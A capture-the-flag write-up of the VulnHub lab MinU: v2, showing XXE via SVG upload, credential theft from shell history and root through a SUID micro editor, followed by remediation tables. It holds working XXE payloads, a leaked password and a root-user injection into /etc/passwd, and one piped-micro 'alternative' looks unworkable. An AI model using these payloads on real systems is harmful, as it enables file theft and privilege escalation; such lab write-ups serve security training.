# MinU: v2 — SVG Bites Back

Alright dudes!! Who would have thought a tiny SVG upload form could hand you the entire box? MinU: v2 is a beautifully layered beginner machine that chains XXE injection through SVG, credential leakage from shell history, and a SUID text editor to own root. No port 80 drama here: the web server runs on port 3306 (yes, the MySQL port). That alone is a hint the machine is trolling you from the start. Legit crafty design, gg to the author.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | MinU: v2 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/minu-v2,333/ |
| **Techniques** | XXE via SVG upload, shell history credential leakage, SUID binary abuse (micro editor), /etc/passwd injection |
| **CVEs** | CWE-611 (Improper Restriction of XML External Entity Reference), CWE-732 (Incorrect Permission Assignment for Critical Resource), CWE-522 (Insufficiently Protected Credentials) |
| **APT Groups** | APT41 (Winnti Group): uses XXE in web-facing apps for initial file read before lateral movement; FIN7: exploits misconfigured file upload endpoints as initial access vector in financial targets |

---

## Attack Summary

```
netdiscover → nmap → port 22 (SSH) + port 3306 (HTTP)
  → dirb on :3306 → SVG upload form discovered
  → XXE via malicious SVG → read /etc/passwd → user: employee
  → XXE → read /.ash_history → employee:superultrapass3
  → SSH as employee
  → find SUID → /usr/bin/micro (text editor)
  → openssl passwd → hash generated
  → micro writes to /etc/passwd → inject UID-0 user
  → su test → id=0(root)
  → /root/flag.txt
```

---

## Methodology

1. Host discovery and service enumeration (ports 22 + 3306)
2. Web directory brute-force on :3306
3. XXE injection via SVG upload to read /etc/passwd
4. Second XXE payload to read /.ash_history and extract credentials
5. SSH login as employee
6. SUID enumeration: /usr/bin/micro identified
7. Inject root-equivalent user into /etc/passwd via SUID micro
8. Switch to injected user, read root flag

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
3306/tcp open  http    (non-MySQL — web server bound to MySQL's default port)
```

The web server intentionally runs on port 3306. Standard scanners that assume 3306 is MySQL will miss it entirely. No port 80 service here: the attacker must scan all ports.

**Real-world note:** Binding services to non-standard ports is a trivial defense-evasion tactic seen in commodity malware and attacker-controlled infrastructure. Always scan the full port range, not just the top 1000.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Directory Enumeration

Browse to `http://192.168.1.101:3306`. The index page reveals nothing useful. Run directory brute-force targeting HTML files:

```bash
dirb http://192.168.1.101:3306 -X .html
```

A single HTML page is found hosting an SVG file upload form. The form explicitly restricts uploads to `.svg` files only. This is the attack surface.

**Alternative:** `gobuster dir -u http://192.168.1.101:3306 -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -t 30`

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — XXE via SVG Upload: Read /etc/passwd

SVG is an XML-based format. If the server parses SVG with external entity resolution enabled, an XXE payload embedded in an SVG will cause the server to read local files and include their content in the rendered output.

Create a malicious SVG with an XXE payload targeting /etc/passwd:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Save as `xxe.svg`, upload through the form, then view the page source of the result. The /etc/passwd contents are rendered inside the SVG text element, revealing users including `employee`.

**Why this works:** The server parses the SVG, resolves the external entity `&xxe;` by reading `file:///etc/passwd`, and includes the content in the response. This is CWE-611, an XML External Entity injection.

**Real-world note:** XXE vulnerabilities affect any application that processes XML (including SVG, DOCX, PDF, SAML, RSS, and more) without disabling external entity resolution. APT41 has weaponized XXE in enterprise web applications for initial file read before escalating to SSRF and SSRF-to-AWS-metadata pivots.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Credentials in Files

---

## Step 4 — XXE via SVG Upload: Read Shell History

The target runs Alpine Linux, which uses `/bin/ash`. The shell history file is `/.ash_history` (not `~/.bash_history`). Update the XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///.ash_history">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Upload `history.svg`. The shell history reveals credentials typed directly on the command line:

```
employee:superultrapass3
```

**Real-world note:** Shell history files are gold mines. Credentials entered as command-line arguments (e.g., `mysql -u root -pPassword123`) or in environment variable exports are permanently recorded in history. Any XXE, LFI, or SSRF that can read arbitrary files will expose these.

**MITRE ATT&CK:** T1552.003 — Credentials in Files: Bash History

---

## Step 5 — SSH Login as employee

```bash
ssh employee@192.168.1.101
# Password: superultrapass3
```

Shell obtained as `employee`. Run basic enumeration:

```bash
id
# uid=1001(employee) gid=1001(employee)
sudo -l
# (nothing interesting or no sudo)
```

**MITRE ATT&CK:** T1078 — Valid Accounts

---

## Step 6 — SUID Enumeration: micro Text Editor

```bash
find / -perm -u=s -type f 2>/dev/null
```

Output includes `/usr/bin/micro`: a modern terminal text editor with the SUID bit set. The SUID bit means the binary runs with the permissions of its owner (root). A text editor with SUID root can write to any file owned by root, including /etc/passwd.

```bash
ls -la /usr/bin/micro
# -rwsr-xr-x 1 root root ... /usr/bin/micro
```

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 7 — Inject Root User via SUID micro

Generate a password hash on the victim or attacker machine:

```bash
openssl passwd -1 -salt user3 pass123
# Output: $1$user3$rAGRVf5p2jYTqtqOW5cPu/
```

Use the SUID micro editor to append a new UID-0 user to /etc/passwd:

```bash
# Open /etc/passwd in micro (SUID: runs as root)
/usr/bin/micro /etc/passwd
# In the editor, navigate to the end of the file
# Append: test:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/ash
# Save: Ctrl+S  |  Exit: Ctrl+Q
```

**Alternative one-liner (if micro supports piped stdin):**

```bash
echo 'test:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/ash' | /usr/bin/micro -
```

Switch to the injected root user:

```bash
su test
# Password: pass123
id
# uid=0(root) gid=0(root) groups=0(root)
```

**MITRE ATT&CK:** T1136.001 — Create Account: Local Account; T1548 — Abuse Elevation Control Mechanism

---

## Step 8 — Root Flag

```bash
cd /root
cat flag.txt
```

Flag captured. (❍ᴥ❍ʋ)

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential | employee:superultrapass3 | /.ash_history via XXE | SSH login |
| Root user (injected) | test:pass123 | /etc/passwd (written via SUID micro) | su to root |
| Root flag | (contents of /root/flag.txt) | /root/flag.txt | Final objective |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | XXE via SVG upload reads arbitrary local files | SVG is XML: any parser that processes SVG without disabling external entities is vulnerable. Enterprise apps (document converters, image processors) frequently fall into this trap | Disable external entity resolution: `LIBXML_NOENT` off, `libxml_disable_entity_loader(true)` in PHP, `XMLConstants.FEATURE_SECURE_PROCESSING` in Java |
| 2 | Shell history contains plaintext credentials | Developers and admins routinely type passwords as CLI arguments; this is recorded permanently | Never pass credentials as CLI arguments; use environment files, vaults, or prompt-based input; set `HISTSIZE=0` for sensitive sessions |
| 3 | SUID bit on text editor grants root write access | Any text editor, interpreter, or file-copying utility with SUID root is a trivial privilege escalation path | Audit all SUID binaries: `find / -perm -4000 -type f 2>/dev/null`; remove SUID from non-essential binaries |
| 4 | Web server on non-standard port evades basic scans | Attackers and defenders both miss services when scanning only default ports | Always scan all 65535 ports: `nmap -p- --min-rate 5000` |
| 5 | Alpine uses /bin/ash and /.ash_history | Forensic investigators relying on bash-specific paths miss artifacts on Alpine, BusyBox, and other embedded Linux distributions | Know your target OS shell; enumerate shell history for all shells on the box |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application (XXE) | T1190 |
| Credential Access | Credential Access | Credentials in Files (shell history) | T1552.003 |
| Lateral Movement | Valid Accounts | Valid Accounts (SSH with creds) | T1078 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |
| Persistence | Persistence | Create Account: Local Account | T1136.001 |
| Defense Evasion | Defense Evasion | Non-Standard Port (3306 as HTTP) | T1571 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable XXE in the SVG parser**: set `LIBXML_NONET | LIBXML_NOENT` in PHP; use `javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING` in Java; configure the parser to disallow DOCTYPE declarations
2. **Restrict shell history**: set `HISTFILE=/dev/null` or `HISTSIZE=0` during privileged operations; use `unset HISTFILE` for sensitive sessions; enforce credential input via prompts or password managers
3. **Remove SUID from micro**: `sudo chmod u-s /usr/bin/micro`; audit all SUID binaries with `find / -perm -4000 -type f 2>/dev/null` on a regular schedule
4. **Run the web service as an unprivileged user**: the web process should not have read access to /home, /root, or shell history files
5. **Move the web service to a standard port**: port 3306 confusion aids attackers in evading scanner defaults; use proper port segregation

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening: disable external entity resolution in all XML parsers
- **D3-OAM** — Operating System Administrative Management: audit and remove SUID bits from non-essential binaries
- **D3-HBPI** — Harden Build Pipeline Integrity: prevent credentials from being embedded in shell history during CI/CD processes

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web-facing file upload endpoints; catalog SUID binaries on all hosts |
| Protect | Data Security | Disable XXE in XML parsers; rotate credentials if exposed via shell history |
| Protect | Access Control | Remove SUID from non-essential binaries; restrict web service user to minimal permissions |
| Detect | Anomalies and Events | Alert on SUID binary execution by non-root users; monitor /etc/passwd modification events |
| Respond | Response Planning | Remove malicious entries injected into /etc/passwd; rotate credentials exposed via XXE |
| Recover | Recovery Planning | Rebuild affected host; audit all accounts for unauthorized UID-0 entries |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-3 | Malicious Code Protection | Scan uploaded files for malicious content before processing |
| AC-6 | Least Privilege | Remove SUID from text editors; restrict web service user |
| IA-5 | Authenticator Management | Rotate all credentials exposed via file read vulnerabilities |
| CM-7 | Least Functionality | Disable external entity resolution; limit uploaded file types |
| AU-9 | Protection of Audit Information | Protect shell history files from web-accessible reads |
| SC-28 | Protection of Information at Rest | Restrict /etc/passwd and shell history to root-only read |

### CISA KEV

XXE vulnerabilities (CWE-611) are consistently present in CISA Known Exploited Vulnerabilities catalog entries for enterprise web applications. CISA AA21-259A and AA22-074A both reference file read via XXE as an initial access technique used by nation-state actors. Organizations should patch XML parsers and disable external entity resolution as a priority remediation.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory (SUID audit) | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges (remove SUID from editors) | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments (XXE scanning) | MIL2 |

---

## Final Thoughts

MinU: v2 is a masterclass in chaining primitives. Each step is modest on its own: read a file, find a password in history, abuse a SUID editor. But together they form a clean, teachable kill chain that mirrors real-world intrusions.

The SVG-as-XXE-vector is a genuinely underrated technique. Most developers think "SVG" and think images, not XML parsers. The machine earns its "v2" badge by keeping the attack surface narrow and forcing precision over spray-and-pray.

Props to the author for the Alpine twist: finding credentials in `/.ash_history` instead of `~/.bash_history` is the kind of detail that separates a good CTF from a great one. No cap.

Thanks guys!! (❍ᴥ❍ʋ)
